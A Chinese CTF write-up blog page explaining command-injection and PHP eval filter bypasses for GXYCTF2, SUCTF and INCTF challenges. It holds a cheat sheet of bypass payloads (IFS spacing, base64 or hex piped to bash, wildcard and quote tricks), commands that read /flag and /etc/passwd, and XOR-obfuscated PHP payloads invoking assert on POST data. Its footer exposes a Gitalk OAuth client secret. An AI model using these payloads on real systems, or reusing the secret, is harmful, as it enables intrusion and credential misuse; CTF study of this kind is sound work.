@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>[GXYCTF2/SUCTF/INCTF](命令执行Bypass) |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="[GXYCTF2/SUCTF/INCTF](命令执行Bypass) |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="[GXYCTF2/SUCTF/INCTF](命令执行Bypass)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/w1zR2_3-1/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[GXYCTF2/SUCTF/INCTF](命令执行Bypass)</h1>
+            <span class="meta">
+            	Posted on
+              2020-01-02，7 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>进入页面。就一个框。输入IP。就想到DVWA的命令注入。一般就&amp;,&amp;&amp;,||,|,;执行命令</p>
+<!-- more -->
+<p>我这里用了;执行命令<br>
+<img src="https://guokeya.github.io/post-images/1577960968903.png" alt="" loading="lazy"></p>
+<p>看到有个flag.php，直接读取不行。<br>
+提示：fxck your space!<br>
+看来是空格被过滤了。使用$IFS$9绕过<br>
+提示：fxck your flag!<br>
+flag又被过滤<br>
+。那就先看看index.php<br>
+<img src="https://guokeya.github.io/post-images/1577960979886.png" alt="" loading="lazy"><br>
+不能有完整的flag字符串。那就变量拼接一下<br>
+<img src="https://guokeya.github.io/post-images/1577960994485.png" alt="" loading="lazy"><br>
+其他解题方法也挺多的。下面总结下：<br>
+过滤空格：</p>
+<pre><code>$IFS/
+${IFS}
+$IFS$9              
+&lt;                           cat&lt;index.php   ls&lt;index.php可以查看当前目录
+&lt;&gt;                          Linux下可以。Web不行
+{cat,flag.php}              Linux下可以。Web不行
+%20                 
+%09    
+$a                          Linux变量未初始化。所以变量为空 l$as=ls
+</code></pre>
+<p>过滤关键字：</p>
+<pre><code>ca\t fla\g.php              反斜杠绕过
+cat  fl''ag.php             两个单引号绕过
+cat  'f''l''a''g''.''php'   
+cat  &quot;fl&quot;&quot;ag.php&quot;           双引号绕过
+cat  &quot;f&quot;&quot;l&quot;&quot;a&quot;&quot;g&quot;&quot;.&quot;&quot;php&quot;
+echo Y2F0IGluZGV4LnBocA==|base64 -d|bash        base64编码绕过
+echo 0x63617420696e6465782e706870|xxd -r|bash   16进制绕过
+cat in[a-z]ex.php           正则匹配
+cat index*                  通配符 
+cat ?????.php               通配符，/bin/ls=/???/ls /bin/cat=/???/?at
+a=fl;b=ag.php;cat $a$b      变量拼接绕过
+cat f`echo $PATH|cut -c 32`ag.php               用cut取出$PATH中的第32个值。l,然后带入cat f`l`ag.php
+$(printf &quot;\x6c\x73&quot;)
+${PWD:12:1}${SHELL:7:1}
+从环境变量得到值。然后截取字符串执行
+过滤尖括号
+echo 1|tee result.txt
+</code></pre>
+<p>内联执行：<br>
+cat ls 将ls执行结果全部带入cat函数中当做参数。相当于cat *<br>
+Linux可执行的终端：</p>
+<pre><code>/bin/bash
+/bin/sh
+/bin/dash
+</code></pre>
+<p><strong>第二题：</strong></p>
+<pre><code>&lt;?php
+    highlight_file(__FILE__);
+    @$a = $_GET['a'];
+    @$b = $_GET['b'];
+ // try bypass it
+    if (preg_match(&quot;/\'|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))
+        $a = &quot;&quot;;
+        $a ='&quot;' . $a . '&quot;';
+    echo &quot;A:&quot;.$a.&quot;&lt;br /&gt;&quot;;
+    if (preg_match(&quot;/\'|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))
+        $b = &quot;&quot;;
+        $b = '&quot;' . $b . '&quot;';
+    echo &quot;B:&quot;.$b.&quot;&lt;br &gt;&quot;;
+     $cmd = &quot;file $a $b&quot;;
+    var_dump($cmd);
+    echo &quot;&lt;br &gt;&quot;;
+      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); 
+      @system($cmd);
+?&gt;
+</code></pre>
+<p>在源码中。可以看到。正则过滤了很多字符。如果匹配到。就将参数替换为空<br>
+最后拼接 为&quot;file &quot;<span class='katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;\&quot;&#039; in math mode at position 2: a\̲&quot;̲ \&quot;'>a\&quot; \&quot;</span>b&quot;&quot;<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">a和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">和</span></span></span></span>b都被双引号包括。<br>
+仔细查看正则过滤。发现\匹配的并不是\，由于\转义成了\，\|\就变成了|,包含|的字符就会被置空<br>
+<img src="https://guokeya.github.io/post-images/1578196205090.png" alt="" loading="lazy"><br>
+由于\可以转义双引号。那么我们就能逃逸<br>
+当我们输入a=\&amp;b=%0al\s%0a时。system执行的内容就变成了下面这样<br>
+&quot;file &quot;\&quot; &quot; l\s &quot;&quot;==&quot;file &quot; &quot; &quot;回车l\s回车&quot; &quot;<br>
+由于“被\转义。<br>
+一二两个双引号闭合了file<br>
+第三个双引号变成普通的双引号字符<br>
+第四五个双引号闭合了我们的命令。第一个%0a(换行)执行了file &quot;<br>
+第二个换行执行了l\s<br>
+最后一个双引号就被忽略了。因为命令已经执行完毕<br>
+<img src="https://guokeya.github.io/post-images/1578196163173.png" alt="" loading="lazy"><br>
+之后读取flag就完事了。用\绕过关键字<br>
+<strong>读取文件的其他命令</strong></p>
+<pre><code>cat
+tac
+more
+less
+head
+tail
+nl
+pr
+tailf
+static-sh /flag                如果flag中包含空格。将无法正常显示
+paste /flag /etc/passwd
+diff /flag /etc/passwd
+od -a /flag
+bzmore /flag
+bzless /flag
+</code></pre>
+<p><strong>第三题:</strong></p>
+<pre><code>&lt;?php
+
+$input = $_GET['input'];
+
+function check(){
+  global $input;
+  foreach (get_defined_functions()['internal'] as $blacklisted) {
+      if (preg_match ('/' . $blacklisted . '/im', $input)) {
+          echo &quot;Your input is blacklisted&quot; . &quot;&lt;br&gt;&quot;;
+          return true;
+          break;
+      }
+  }
+  $blacklist = &quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\&quot;|\'&quot;;
+  unset($blacklist);
+  return false;
+}
+
+$thisfille=$_GET['thisfile'];
+
+if(is_file($thisfille)){
+  echo &quot;You can't use inner file&quot; . &quot;&lt;br&gt;&quot;;
+}
+else{
+  if(file_exists($thisfille)){
+    if(check()){
+      echo &quot;Naaah&quot; . &quot;&lt;br&gt;&quot;;
+    }else{
+      eval($input);
+    }
+  }else{
+    echo &quot;File doesn't exist&quot; . &quot;&lt;br&gt;&quot;;
+  }
+
+}
+
+function iterate($ass){
+    foreach($ass as $hole){
+        echo &quot;AssHole&quot;;
+    }
+}
+
+highlight_file(__FILE__);
+?&gt;
+</code></pre>
+<p>有两个参数可控<br>
+1:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>l</mi><mi>s</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">经</mi><mi mathvariant="normal">过</mi><mi>i</mi><msub><mi>s</mi><mi>f</mi></msub><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>e</mi></msub><mi>x</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>s</mi><mn>2</mn><mo>:</mo></mrow><annotation encoding="application/x-tex">thilsfile，要经过is_file，file_exists
+2:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span></span>input，要匹配PHP内置函数<br>
+那么我们只要构造<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">由</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">能</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">现</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">异</mi><mi mathvariant="normal">或</mi><mi mathvariant="normal">或</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">反</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">构</mi><mi mathvariant="normal">造</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi></mrow><annotation encoding="application/x-tex">input就行了
+由于不能出现函数。那么就可以通过异或或取反这类操作。构造出一个</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">异</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span></span></span></span>a=_POST[a];eval($$a)<br>
+<code>${~%A0%AF%B0%AC%AB}[a];eval($b);</code><br>
+介绍个小trips。eval\echo在PHP中属于语言结构而不是函数,一个eval函数只能执行一次<br>
+<img src="https://guokeya.github.io/post-images/1578224328365.png" alt="" loading="lazy"><br>
+当然还能通过拼接字符串的方式去执行命令<br>
+定义一个变量。内容是以点拼接的函数最后调用变量+参数<br>
+<img src="https://guokeya.github.io/post-images/1578224451671.png" alt="" loading="lazy"><br>
+<strong>加强版</strong></p>
+<pre><code>&lt;?php
+
+$input = $_GET['input'];
+
+function check(){
+  global $input;
+  foreach (get_defined_functions()['internal'] as $blacklisted) {
+      if (preg_match ('/' . $blacklisted . '/im', $input)) {
+          echo &quot;Your input is blacklisted&quot; . &quot;&lt;br&gt;&quot;;
+          return true;
+          break;
+      }
+  }
+  $blacklist = &quot;exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\&quot;|\'&quot;;
+  if(preg_match(&quot;/$blacklist/i&quot;, $input)){
+    echo &quot;Do you really you need that?&quot; . &quot;&lt;br&gt;&quot;;
+    return true;
+  }
+
+  unset($blacklist);
+  return false;
+}
+
+$thisfille=$_GET['thisfile'];
+
+if(is_file($thisfille)){
+  echo &quot;You can't use inner file&quot; . &quot;&lt;br&gt;&quot;;
+}
+else{
+  if(file_exists($thisfille)){
+    if(check()){
+      echo &quot;Naaah&quot; . &quot;&lt;br&gt;&quot;;
+    }else{
+      eval($input);
+    }
+  }else{
+    echo &quot;File doesn't exist&quot; . &quot;&lt;br&gt;&quot;;
+  }
+
+}
+
+function iterate($ass){
+    foreach($ass as $hole){
+        echo &quot;AssHole&quot;;
+    }
+}
+
+highlight_file(__FILE__);
+?&gt;
+</code></pre>
+<p>在上一题的基础上增加了过滤<br>
+<code>exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\&quot;|\'</code><br>
+过滤了eval和[]{}还有~这三个关键点。我们不能直接通过[a]{a}来获取POST的值。<br>
+过滤了~，但没过滤<sup>，我们可以通过</sup>来构造_POST<br>
+没了eval还有assert。<br>
+POST本质上是个数组。我们可以通过current来获取当前数组的值</p>
+<pre><code>$a=%ff%ff%ff%ff%ff^%a0%af%b0%ac%ab;
+//_POST
+$b=$$a;
+//$_POST
+$c=c.u.r.r.e.n.t
+//current
+$d=$c($b)
+//current($_POST)   取值
+$e=a.s.s.e.r.t
+//assert
+$e($d)
+//assert(current($_POST))
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1578226084152.png" alt="" loading="lazy"></figure>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/NKxxYI57q/">
+              <span class="post-title">
+                GET命令执行漏洞[HITCON 2017]SSRFme&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br ><!--test--></a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
